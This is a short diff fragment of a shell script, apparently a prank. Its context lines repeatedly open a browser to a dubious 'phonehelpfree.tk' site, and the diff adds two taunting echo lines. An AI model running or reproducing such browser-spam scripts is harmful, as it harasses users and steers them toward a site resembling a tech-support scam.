@@ -47,3 +47,5 @@ x-www-browser http://phonehelpfree.tk/
 x-www-browser http://phonehelpfree.tk/
 x-www-browser http://phonehelpfree.tk/
 x-www-browser http://phonehelpfree.tk/
+echo "HAHAHAHAHHAHAHHAHAH"
+SAY "LOLOLOLOLOL"
